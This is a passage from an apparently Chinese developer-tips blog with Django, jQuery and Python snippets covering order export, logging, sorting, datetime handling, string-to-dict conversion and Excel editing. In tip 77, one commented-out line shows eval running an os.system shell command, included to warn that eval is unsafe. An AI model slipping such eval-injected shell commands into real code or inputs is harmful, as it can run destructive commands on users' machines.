class=&quot;modal-dialog&quot;&gt;</span><br><span class=\"line\">            &lt;div class=&quot;modal-content&quot;&gt;</span><br><span class=\"line\">                &lt;form method=&quot;get&quot; action=&quot;&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">                    &lt;div class=&quot;modal-header&quot;&gt;</span><br><span class=\"line\">                        &lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;modal&quot; aria-hidden=&quot;true&quot;&gt;&amp;times;&lt;/button&gt;</span><br><span class=\"line\">                        &lt;h4 class=&quot;modal-title&quot;&gt;&#123;% trans &quot;Export&quot; %&#125; &#123;&#123;et.name&#125;&#125;&lt;/h4&gt;</span><br><span class=\"line\">                    &lt;/div&gt;</span><br><span class=\"line\">                    &lt;div class=&quot;modal-body&quot;&gt;</span><br><span class=\"line\">                        &#123;&#123; form_params|safe &#125;&#125;</span><br><span class=\"line\">                        &lt;input type=&quot;hidden&quot; name=&quot;export_type&quot; value=&quot;&#123;&#123;et.type&#125;&#125;&quot;&gt;</span><br><span class=\"line\">                        &lt;!-- 增加 导出所选数据 一栏 --&gt;</span><br><span class=\"line\">                        &lt;input type=&quot;hidden&quot; name=&quot;_selected_actions&quot; value=&quot;&quot;/&gt;</span><br><span class=\"line\">                        &lt;input type=&quot;hidden&quot; name=&quot;_select_across&quot; value=&quot;&quot;/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">                        &lt;label class=&quot;checkbox&quot;&gt;</span><br><span class=\"line\">                            &#123;% if et.type == &quot;xlsx&quot; %&#125;</span><br><span class=\"line\">                            &lt;input type=&quot;checkbox&quot; name=&quot;export_xlsx_header&quot; checked=&quot;checked&quot; value=&quot;on&quot;&gt;</span><br><span class=\"line\">                            &#123;% trans &quot;Export with table header.&quot; %&#125;</span><br><span class=\"line\">                            &#123;% endif %&#125;</span><br><span class=\"line\">                            &#123;% if et.type == &quot;xls&quot; %&#125;</span><br><span class=\"line\">                            &lt;input type=&quot;checkbox&quot; name=&quot;export_xls_header&quot; checked=&quot;checked&quot; value=&quot;on&quot;&gt;</span><br><span class=\"line\">                            &#123;% trans &quot;Export with table header.&quot; %&#125;</span><br><span class=\"line\">                            &#123;% endif %&#125;</span><br><span class=\"line\">                            &#123;% if et.type == &quot;csv&quot; %&#125;</span><br><span class=\"line\">                            &lt;input type=&quot;checkbox&quot; name=&quot;export_csv_header&quot; checked=&quot;checked&quot; value=&quot;on&quot;&gt;</span><br><span class=\"line\">                            &#123;% trans &quot;Export with table header.&quot; %&#125;</span><br><span class=\"line\">                            &#123;% endif %&#125;</span><br><span class=\"line\">                            &#123;% if et.type == &quot;xml&quot; %&#125;</span><br><span class=\"line\">                            &lt;input type=&quot;checkbox&quot; name=&quot;export_xml_format&quot; checked=&quot;checked&quot; value=&quot;on&quot;&gt;</span><br><span class=\"line\">                            &#123;% trans &quot;Export with format.&quot; %&#125;</span><br><span class=\"line\">                            &#123;% endif %&#125;</span><br><span class=\"line\">                            &#123;% if et.type == &quot;json&quot; %&#125;</span><br><span class=\"line\">                            &lt;input type=&quot;checkbox&quot; name=&quot;export_json_format&quot; checked=&quot;checked&quot; value=&quot;on&quot;&gt;</span><br><span class=\"line\">                            &#123;% trans &quot;Export with format.&quot; %&#125;</span><br><span class=\"line\">                            &#123;% endif %&#125;</span><br><span class=\"line\">                        &lt;/label&gt;</span><br><span class=\"line\">                        &lt;label class=&quot;checkbox&quot;&gt;</span><br><span class=\"line\">                            &lt;input type=&quot;checkbox&quot; name=&quot;all&quot; value=&quot;on&quot;&gt; &#123;% trans &quot;Export all data.&quot; %&#125;</span><br><span class=\"line\">                        &lt;/label&gt;</span><br><span class=\"line\">                        &lt;!-- 增加 导出所选数据 一栏 --&gt;</span><br><span class=\"line\">                        &lt;label class=&quot;checkbox&quot;&gt;</span><br><span class=\"line\">                            &lt;input type=&quot;checkbox&quot; name=&quot;selected&quot; value=&quot;on&quot;&gt; 导出勾选数据</span><br><span class=\"line\">                        &lt;/label&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">                    &lt;/div&gt;</span><br><span class=\"line\">                    &lt;div class=&quot;modal-footer&quot;&gt;</span><br><span class=\"line\">                        &lt;button type=&quot;button&quot; class=&quot;btn btn-default&quot; data-dismiss=&quot;modal&quot;&gt;&#123;% trans &quot;Close&quot; %&#125;&lt;/button&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">                        &lt;button class=&quot;btn btn-success myexport  glyphicon glyphicon-export &quot; type=&quot;submit&quot;&gt;&lt;i</span><br><span class=\"line\">                                class=&quot;fa fa-share&quot;&gt;&lt;/i&gt; &#123;% trans &quot;Export&quot; %&#125;</span><br><span class=\"line\">                        &lt;/button&gt;</span><br><span class=\"line\">                    &lt;/div&gt;</span><br><span class=\"line\">                &lt;/form&gt;</span><br><span class=\"line\">            &lt;/div&gt;&lt;!-- /.modal-content --&gt;</span><br><span class=\"line\">        &lt;/div&gt;&lt;!-- /.modal-dalog --&gt;</span><br><span class=\"line\">    &lt;/div&gt;&lt;!-- /.modal --&gt;</span><br><span class=\"line\">    &#123;% endfor %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\">    // 如果是订单导出，把待出货订单设置成待收货订单</span><br><span class=\"line\">    $(document).ready(function () &#123;</span><br><span class=\"line\">        $(&#x27;.myexport&#x27;).click(function () &#123;</span><br><span class=\"line\">            // 当把订单导出时，需要修改订单状态为待收货状态</span><br><span class=\"line\">            var url = window.location.protocol + &#x27;//&#x27; + window.location.host + &quot;/exportorder/&quot;;</span><br><span class=\"line\">            $(&quot;input[name=&#x27;_select_across&#x27;]&quot;).val($(&quot;input[name=&#x27;select_across&#x27;]&quot;).val());</span><br><span class=\"line\">            if ($(&quot;input[name=&#x27;selected&#x27;]&quot;).is(&#x27;:checked&#x27;)) &#123;</span><br><span class=\"line\">                var arr = [];</span><br><span class=\"line\">                $.each($(&#x27;.action-select&#x27;), function () &#123;</span><br><span class=\"line\">                    if (true == $(this).prop(&#x27;checked&#x27;)) &#123;</span><br><span class=\"line\">                        arr.push($(this).val());</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\">                if(arr.length == 0)&#123;</span><br><span class=\"line\">                    alert(&#x27;请先勾选导出数据&#x27;)</span><br><span class=\"line\">                    return false</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;else&#123;</span><br><span class=\"line\">                var arr = []</span><br><span class=\"line\">                var order_type = $(&#x27;.breadcrumb li&#x27;).eq(1).text().trim()</span><br><span class=\"line\">                $(&#x27;.grid-item&#x27;).each(function (index, el) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                    arr.push($(el).find(&#x27;td&#x27;).eq(1).text().trim())</span><br><span class=\"line\">                &#125;)</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            if (($(&#x27;.breadcrumb &gt; li&#x27;).eq(1).text()).indexOf(&#x27;订单&#x27;) != -1) &#123;</span><br><span class=\"line\">                // 5秒后执行</span><br><span class=\"line\">                setTimeout(function () &#123;</span><br><span class=\"line\">                    $.ajax(&#123;</span><br><span class=\"line\">                        type: &quot;POST&quot;,</span><br><span class=\"line\">                        url: url,</span><br><span class=\"line\">                        data: &#123;&#x27;orderlist&#x27;: JSON.stringify(arr), &#x27;order_type&#x27;: order_type,&#125;,</span><br><span class=\"line\">                        beforeSend: function (xhr) &#123;</span><br><span class=\"line\">                            xhr.setRequestHeader(&quot;X-CSRFToken&quot;, $.getCookie(&quot;csrftoken&quot;))</span><br><span class=\"line\">                        &#125;,</span><br><span class=\"line\">                        success: function (data) &#123;</span><br><span class=\"line\">                            window.location.reload();</span><br><span class=\"line\">                        &#125;,</span><br><span class=\"line\">                        error: function (xhr) &#123;</span><br><span class=\"line\">                            alert(&quot;出现未知错误&quot;);</span><br><span class=\"line\">                            window.location.reload();</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;);</span><br><span class=\"line\">                &#125;, 5000);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"68、使用F查询更新用户重要数据\"><a href=\"#68、使用F查询更新用户重要数据\" class=\"headerlink\" title=\"68、使用F查询更新用户重要数据\"></a>68、使用F查询更新用户重要数据</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">from django.db.models import F</span><br><span class=\"line\"># 使用F查询更新用户余额</span><br><span class=\"line\">balance = 5  </span><br><span class=\"line\">MallUser.objects.filter(id=1).update(balance=F(&#x27;balance&#x27;) + balance)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>相当于sql的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">update Malluser set balance=balance + 5 where id=1;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"69、日志输出模块\"><a href=\"#69、日志输出模块\" class=\"headerlink\" title=\"69、日志输出模块\"></a>69、日志输出模块</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import logging</span><br><span class=\"line\">import platform</span><br><span class=\"line\"># 全局函数</span><br><span class=\"line\">PlATFORM = platform.system()</span><br><span class=\"line\">if (PlATFORM == &quot;Linux&quot;):</span><br><span class=\"line\">    # linux系统,文件保存在var下</span><br><span class=\"line\">    SERVER_LOG_PATH = &#x27;/var/mylog.log&#x27;</span><br><span class=\"line\">else:</span><br><span class=\"line\">    # windows系统,文件保存在D盘下</span><br><span class=\"line\">    SERVER_LOG_PATH = &#x27;D:\\mylog.log&#x27;</span><br><span class=\"line\"># 定义一个logging的对象，命名为mylog</span><br><span class=\"line\">LOGGER = logging.getLogger(&#x27;mylog&#x27;)</span><br><span class=\"line\"># 设置级别为WARNING</span><br><span class=\"line\">LOGGER.setLevel(logging.WARNING)</span><br><span class=\"line\"># 创建一个handler，用于写入日志文件</span><br><span class=\"line\">fh = logging.FileHandler(SERVER_LOG_PATH, encoding=&#x27;utf-8&#x27;)</span><br><span class=\"line\">fh.setLevel(logging.WARNING)</span><br><span class=\"line\"># 定义handler的输出格式</span><br><span class=\"line\">formatter = logging.Formatter(&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;, datefmt=&#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class=\"line\">fh.setFormatter(formatter)</span><br><span class=\"line\"># 给Logger添加handler</span><br><span class=\"line\">LOGGER.addHandler(fh)</span><br><span class=\"line\"># 不在控制台显示</span><br><span class=\"line\">LOGGER.propagate = False</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"70、字典排序\"><a href=\"#70、字典排序\" class=\"headerlink\" title=\"70、字典排序\"></a>70、字典排序</h2><p>字典在内存中发布是无序的，当想对键值或者键名进行排序时可以先把字典转成元组，这可以达到排序的目的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">score = &#123;&#x27;小明&#x27;: &#123;&#x27;avg_score&#x27;: 90, &#x27;English&#x27;: 90, &#x27;Math&#x27;: 90, &#x27;Chniese&#x27;: 90, &#125;,</span><br><span class=\"line\">     &#x27;小红&#x27;: &#123;&#x27;avg_score&#x27;: 60, &#x27;English&#x27;: 60, &#x27;Math&#x27;: 61, &#x27;Chniese&#x27;: 59, &#125;,</span><br><span class=\"line\">     &#x27;小黑&#x27;: &#123;&#x27;avg_score&#x27;: 70, &#x27;English&#x27;: 75, &#x27;Math&#x27;: 65, &#x27;Chniese&#x27;: 70, &#125;,</span><br><span class=\"line\">     &#x27;小白&#x27;: &#123;&#x27;avg_score&#x27;: 80, &#x27;English&#x27;: 95, &#x27;Math&#x27;: 65, &#x27;Chniese&#x27;: 80, &#125;,</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"># 对姓名进行排序，即对键名进行排序</span><br><span class=\"line\">b = sorted(score.items(), key=lambda x: x[0], reverse=True)</span><br><span class=\"line\">show_str = &#x27;&#x27;</span><br><span class=\"line\">for info in b:</span><br><span class=\"line\">    # print(info)</span><br><span class=\"line\">    key, value = info[0], info[1]</span><br><span class=\"line\">    show_str += &#x27;姓名：&#123;&#125;,平均分：&#123;&#125;，成绩：&#123;&#125;&#x27;.format(key,value[&#x27;avg_score&#x27;], value) + &#x27;\\r\\n&#x27;</span><br><span class=\"line\">print(&#x27;对姓名进行排序&#x27;)</span><br><span class=\"line\">print(show_str)</span><br><span class=\"line\"># 对平均分进行排序</span><br><span class=\"line\">b = sorted(score.items(), key=lambda x: x[1][&#x27;avg_score&#x27;], reverse=True)</span><br><span class=\"line\">show_str = &#x27;&#x27;</span><br><span class=\"line\">for info in b:</span><br><span class=\"line\">    # print(info)</span><br><span class=\"line\">    key, value = info[0], info[1]</span><br><span class=\"line\">    show_str += &#x27;姓名：&#123;&#125;,平均分：&#123;&#125;，成绩：&#123;&#125;&#x27;.format(key,value[&#x27;avg_score&#x27;], value) + &#x27;\\r\\n&#x27;</span><br><span class=\"line\">print(&#x27;对平均分进行排序&#x27;)</span><br><span class=\"line\">print(show_str)</span><br><span class=\"line\"></span><br><span class=\"line\"># 对英语成绩进行排序</span><br><span class=\"line\">b = sorted(score.items(), key=lambda x: x[1][&#x27;English&#x27;], reverse=True)</span><br><span class=\"line\">show_str = &#x27;&#x27;</span><br><span class=\"line\">for info in b:</span><br><span class=\"line\">    # print(info)</span><br><span class=\"line\">    key, value = info[0], info[1]</span><br><span class=\"line\">    show_str += &#x27;姓名：&#123;&#125;,平均分：&#123;&#125;，成绩：&#123;&#125;&#x27;.format(key,value[&#x27;avg_score&#x27;], value) + &#x27;\\r\\n&#x27;</span><br><span class=\"line\">print(&#x27;对英语成绩进行排序&#x27;)</span><br><span class=\"line\">print(show_str)</span><br></pre></td></tr></table></figure>\n\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">对姓名进行排序</span><br><span class=\"line\">姓名：小黑,平均分：70，成绩：&#123;&#x27;avg_score&#x27;: 70, &#x27;English&#x27;: 75, &#x27;Math&#x27;: 65, &#x27;Chniese&#x27;: 70&#125;</span><br><span class=\"line\">姓名：小红,平均分：60，成绩：&#123;&#x27;avg_score&#x27;: 60, &#x27;English&#x27;: 60, &#x27;Math&#x27;: 61, &#x27;Chniese&#x27;: 59&#125;</span><br><span class=\"line\">姓名：小白,平均分：80，成绩：&#123;&#x27;avg_score&#x27;: 80, &#x27;English&#x27;: 95, &#x27;Math&#x27;: 65, &#x27;Chniese&#x27;: 80&#125;</span><br><span class=\"line\">姓名：小明,平均分：90，成绩：&#123;&#x27;avg_score&#x27;: 90, &#x27;English&#x27;: 90, &#x27;Math&#x27;: 90, &#x27;Chniese&#x27;: 90&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">对平均分进行排序</span><br><span class=\"line\">姓名：小明,平均分：90，成绩：&#123;&#x27;avg_score&#x27;: 90, &#x27;English&#x27;: 90, &#x27;Math&#x27;: 90, &#x27;Chniese&#x27;: 90&#125;</span><br><span class=\"line\">姓名：小白,平均分：80，成绩：&#123;&#x27;avg_score&#x27;: 80, &#x27;English&#x27;: 95, &#x27;Math&#x27;: 65, &#x27;Chniese&#x27;: 80&#125;</span><br><span class=\"line\">姓名：小黑,平均分：70，成绩：&#123;&#x27;avg_score&#x27;: 70, &#x27;English&#x27;: 75, &#x27;Math&#x27;: 65, &#x27;Chniese&#x27;: 70&#125;</span><br><span class=\"line\">姓名：小红,平均分：60，成绩：&#123;&#x27;avg_score&#x27;: 60, &#x27;English&#x27;: 60, &#x27;Math&#x27;: 61, &#x27;Chniese&#x27;: 59&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">对英语成绩进行排序</span><br><span class=\"line\">姓名：小白,平均分：80，成绩：&#123;&#x27;avg_score&#x27;: 80, &#x27;English&#x27;: 95, &#x27;Math&#x27;: 65, &#x27;Chniese&#x27;: 80&#125;</span><br><span class=\"line\">姓名：小明,平均分：90，成绩：&#123;&#x27;avg_score&#x27;: 90, &#x27;English&#x27;: 90, &#x27;Math&#x27;: 90, &#x27;Chniese&#x27;: 90&#125;</span><br><span class=\"line\">姓名：小黑,平均分：70，成绩：&#123;&#x27;avg_score&#x27;: 70, &#x27;English&#x27;: 75, &#x27;Math&#x27;: 65, &#x27;Chniese&#x27;: 70&#125;</span><br><span class=\"line\">姓名：小红,平均分：60，成绩：&#123;&#x27;avg_score&#x27;: 60, &#x27;English&#x27;: 60, &#x27;Math&#x27;: 61, &#x27;Chniese&#x27;: 59&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"对列表中字典按多个键值排序\"><a href=\"#对列表中字典按多个键值排序\" class=\"headerlink\" title=\"对列表中字典按多个键值排序\"></a>对列表中字典按多个键值排序</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">from operator import itemgetter</span><br><span class=\"line\">data = [</span><br><span class=\"line\">    &#123;&#x27;code&#x27;: 1, &#x27;position&#x27;: 300, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;,</span><br><span class=\"line\">    &#123;&#x27;code&#x27;: 2, &#x27;position&#x27;: 255, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;,</span><br><span class=\"line\">    &#123;&#x27;code&#x27;: 3, &#x27;position&#x27;: 256, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;,</span><br><span class=\"line\">    &#123;&#x27;code&#x27;: 1, &#x27;position&#x27;: 500, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;,</span><br><span class=\"line\">    &#123;&#x27;code&#x27;: 5, &#x27;position&#x27;: 455, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;,</span><br><span class=\"line\">    &#123;&#x27;code&#x27;: 1, &#x27;position&#x27;: 322, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;,</span><br><span class=\"line\">    &#123;&#x27;code&#x27;: 6, &#x27;position&#x27;: 676, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;,</span><br><span class=\"line\">]</span><br><span class=\"line\">data = sorted(data, key=itemgetter(&#x27;code&#x27;, &#x27;position&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">print(data)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[</span><br><span class=\"line\">&#123;&#x27;code&#x27;: 1, &#x27;position&#x27;: 300, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;, </span><br><span class=\"line\">&#123;&#x27;code&#x27;: 1, &#x27;position&#x27;: 322, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;, </span><br><span class=\"line\">&#123;&#x27;code&#x27;: 1, &#x27;position&#x27;: 500, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;, </span><br><span class=\"line\">&#123;&#x27;code&#x27;: 2, &#x27;position&#x27;: 255, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;, </span><br><span class=\"line\">&#123;&#x27;code&#x27;: 3, &#x27;position&#x27;: 256, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;, </span><br><span class=\"line\">&#123;&#x27;code&#x27;: 5, &#x27;position&#x27;: 455, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;, </span><br><span class=\"line\">&#123;&#x27;code&#x27;: 6, &#x27;position&#x27;: 676, &#x27;time&#x27;: &#x27;1620442242&#x27;&#125;]</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"71、时间格式与字符串互转、比较大小\"><a href=\"#71、时间格式与字符串互转、比较大小\" class=\"headerlink\" title=\"71、时间格式与字符串互转、比较大小\"></a>71、时间格式与字符串互转、比较大小</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import datetime</span><br><span class=\"line\"></span><br><span class=\"line\"># 当前时间转字符串</span><br><span class=\"line\">now = datetime.datetime.strftime(datetime.datetime.now(), &#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class=\"line\"># 字符串转时间格式</span><br><span class=\"line\">now = datetime.datetime.strptime(now, &#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class=\"line\">a = now + datetime.timedelta(minutes=-15)</span><br><span class=\"line\"># 时间比较大小</span><br><span class=\"line\">if a &lt; now:</span><br><span class=\"line\">    print(&#x27;yes&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"72、python把’-u’开头的字符串转中文\"><a href=\"#72、python把’-u’开头的字符串转中文\" class=\"headerlink\" title=\"72、python把’\\u’开头的字符串转中文\"></a>72、python把’\\u’开头的字符串转中文</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">str_data = &#x27;\\\\u7528\\\\u6237 ID \\\\u6216\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef&#x27;</span><br><span class=\"line\"># 字符串.encode(&#x27;utf-8&#x27;).decode(&#x27;unicode_escape&#x27;)</span><br><span class=\"line\">str_data_to_zh = str_data.encode(&#x27;utf-8&#x27;).decode(&#x27;unicode_escape&#x27;)</span><br><span class=\"line\">print(str_data_to_zh)</span><br><span class=\"line\"></span><br><span class=\"line\"># 输出</span><br><span class=\"line\">用户 ID 或密码错误</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"73、django进行数据迁移时出现No-changes-detected解决方案\"><a href=\"#73、django进行数据迁移时出现No-changes-detected解决方案\" class=\"headerlink\" title=\"73、django进行数据迁移时出现No changes detected解决方案\"></a>73、django进行数据迁移时出现No changes detected解决方案</h2><p>原因：可能是由于app下面没有migrations文件夹<br>所以需要创建这个文件夹，命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python manage.py makemigrations --empty 你的app名称</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"74、ubuntu下载文件到windows桌面\"><a href=\"#74、ubuntu下载文件到windows桌面\" class=\"headerlink\" title=\"74、ubuntu下载文件到windows桌面\"></a>74、ubuntu下载文件到windows桌面</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt install lrzsz</span><br><span class=\"line\">sz 123.txt</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"75、git查看提交日志\"><a href=\"#75、git查看提交日志\" class=\"headerlink\" title=\"75、git查看提交日志\"></a>75、git查看提交日志</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">git log --author=&quot;ldc&quot;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"76、python翻译模块\"><a href=\"#76、python翻译模块\" class=\"headerlink\" title=\"76、python翻译模块\"></a>76、python翻译模块</h2><p>可以把英文翻译成中文，也可以把中文翻译成英文</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install  translate</span><br><span class=\"line\"></span><br><span class=\"line\">from translate import Translator</span><br><span class=\"line\"></span><br><span class=\"line\">name = &#x27;giant panda, panda, panda bear, coon bear, Ailuropoda melanoleuca&#x27;</span><br><span class=\"line\">translator = Translator(to_lang=&quot;chinese&quot;)</span><br><span class=\"line\">translation = translator.translate(name)</span><br><span class=\"line\">print(translation)</span><br><span class=\"line\"></span><br><span class=\"line\">translator= Translator(from_lang=&quot;chinese&quot;,to_lang=&quot;english&quot;)</span><br><span class=\"line\">translation = translator.translate(&quot;我想你&quot;)</span><br><span class=\"line\">print(translation)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">输出：</span><br><span class=\"line\"></span><br><span class=\"line\">大熊猫，熊猫，熊猫熊，浣熊，大熊猫</span><br><span class=\"line\">I missed you.</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"77、python实现字符串转字典\"><a href=\"#77、python实现字符串转字典\" class=\"headerlink\" title=\"77、python实现字符串转字典\"></a>77、python实现字符串转字典</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import ast</span><br><span class=\"line\">import json</span><br><span class=\"line\"></span><br><span class=\"line\">target_str = &#x27;&#123;&quot;h&quot;: 1, &quot;e&quot;: 2, &quot;l&quot;: 3, &quot;l&quot;: 4, &quot;o&quot;: 5&#125;&#x27;</span><br><span class=\"line\">target_str2 = &quot;&#123;&#x27;h&#x27;: 1, &#x27;e&#x27;: 2, &#x27;l&#x27;: 3, &#x27;l&#x27;: 4, &#x27;o&#x27;: 5&#125;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 方式1：使用json，缺点，字符串中不能出现单引号</span><br><span class=\"line\"># 由于 json 语法规定 数组或对象之中的字符串必须使用双引号，不能使用单引号</span><br><span class=\"line\"># 官网https://www.json.org/json-en.html上有一段描述是</span><br><span class=\"line\"># A string is a sequence of zero or more Unicode characters, wrapped in double quotes, using backslash escapes</span><br><span class=\"line\">print(json.loads(target_str))</span><br><span class=\"line\"># print(json.loads(target_str2))   # 使用json转这个字符串会报错 Expecting property name enclosed in double quotes</span><br><span class=\"line\"></span><br><span class=\"line\"># 方式2：使用eval函数，缺点，不安全</span><br><span class=\"line\">print(eval(target_str))</span><br><span class=\"line\">print(eval(target_str2))</span><br><span class=\"line\"># print(eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;))  # 会列出当前的目录文件，如果字符串是一些删除命令，则可以把整个目录清空！</span><br><span class=\"line\"></span><br><span class=\"line\"># 方式3，使用ast.literal_eval，没有json与eval的缺点，推荐使用这个</span><br><span class=\"line\">print(ast.literal_eval(target_str))</span><br><span class=\"line\">print(ast.literal_eval(target_str2))</span><br></pre></td></tr></table></figure>\n\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&#x27;h&#x27;: 1, &#x27;e&#x27;: 2, &#x27;l&#x27;: 4, &#x27;o&#x27;: 5&#125;</span><br><span class=\"line\">&#123;&#x27;h&#x27;: 1, &#x27;e&#x27;: 2, &#x27;l&#x27;: 4, &#x27;o&#x27;: 5&#125;</span><br><span class=\"line\">&#123;&#x27;h&#x27;: 1, &#x27;e&#x27;: 2, &#x27;l&#x27;: 4, &#x27;o&#x27;: 5&#125;</span><br><span class=\"line\">&#123;&#x27;h&#x27;: 1, &#x27;e&#x27;: 2, &#x27;l&#x27;: 4, &#x27;o&#x27;: 5&#125;</span><br><span class=\"line\">&#123;&#x27;h&#x27;: 1, &#x27;e&#x27;: 2, &#x27;l&#x27;: 4, &#x27;o&#x27;: 5&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"78、django-app-如何在后台显示中文名\"><a href=\"#78、django-app-如何在后台显示中文名\" class=\"headerlink\" title=\"78、django app 如何在后台显示中文名\"></a>78、django app 如何在后台显示中文名</h2><p>1.在app (这里以user为例)下面的__init__.py文件中</p>\n<p>添加:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">default_app_config = &#x27;user.apps.UserConfig&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>2.在apps.py中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">from django.apps import AppConfig</span><br><span class=\"line\"></span><br><span class=\"line\">class UserConfig(AppConfig):</span><br><span class=\"line\">    name = &#x27;user&#x27;</span><br><span class=\"line\">    verbose_name = &#x27;用户&#x27;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"79、使用python给Excel指定行添加数据\"><a href=\"#79、使用python给Excel指定行添加数据\" class=\"headerlink\" title=\"79、使用python给Excel指定行添加数据\"></a>79、使用python给Excel指定行添加数据</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import openpyxl, sys</span><br><span class=\"line\"></span><br><span class=\"line\">wb = openpyxl.load_workbook(&#x27;b.xlsx&#x27;)</span><br><span class=\"line\">sheet = wb[&#x27;Sheet1&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\"># 在excel表格第二行添加新数据</span><br><span class=\"line\">addrow = 1   # 增加一行</span><br><span class=\"line\">row = 2  # 在第二行新增一行</span><br><span class=\"line\">name = &#x27;b-back.xlsx&#x27; # 新的表名</span><br><span class=\"line\"></span><br><span class=\"line\">wb1 = openpyxl.Workbook()</span><br><span class=\"line\">sheet1 = wb1[&#x27;Sheet&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\"># 复制前row行</span><br><span class=\"line\">for i in range(1, row):</span><br><span class=\"line\">    for j in range(1, sheet.max_column + 1):</span><br><span class=\"line\">        sheet1.cell(row=i, column=j).value = sheet.cell(row=i, column=j).value</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 复制后row行</span><br><span class=\"line\">for i in range(row, sheet.max_row + 1):</span><br><span class=\"line\">    for j in range(1, sheet.max_column + 1):</span><br><span class=\"line\">        if i == row:</span><br><span class=\"line\">            # 给第row行添加新的数据</span><br><span class=\"line\">            sheet1.cell(row=row, column=j).value = &#x27;新增&#x27;</span><br><span class=\"line\">        sheet1.cell(row=i + addrow, column=j).value = sheet.cell(row=i, column=j).value</span><br><span class=\"line\"></span><br><span class=\"line\">wb1.save(name)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/20200526120005871.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"80、python中的format格式拼接字符串\"><a href=\"#80、python中的format格式拼接字符串\" class=\"headerlink\" title=\"80、python中的format格式拼接字符串\"></a>80、python中的format格式拼接字符串</h2><figure class=\"highlight 